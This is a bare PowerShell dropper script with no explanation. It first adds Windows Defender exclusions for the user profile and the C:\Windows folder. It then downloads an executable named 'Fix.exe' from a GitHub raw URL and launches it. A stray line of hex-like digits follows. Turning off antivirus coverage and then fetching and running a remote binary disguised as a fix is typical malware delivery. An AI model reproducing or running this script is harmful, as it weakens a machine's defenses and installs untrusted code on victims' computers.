Add-MpPreference -ExclusionPath $env:USERPROFILE
Add-MpPreference -ExclusionPath C:\Windows
$url = "https://github.com/hot90923/123/raw/refs/heads/main/Fix.exe"
$output = "$env:Fix.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output

00000000000000000300000000005BE000005CE000000000 
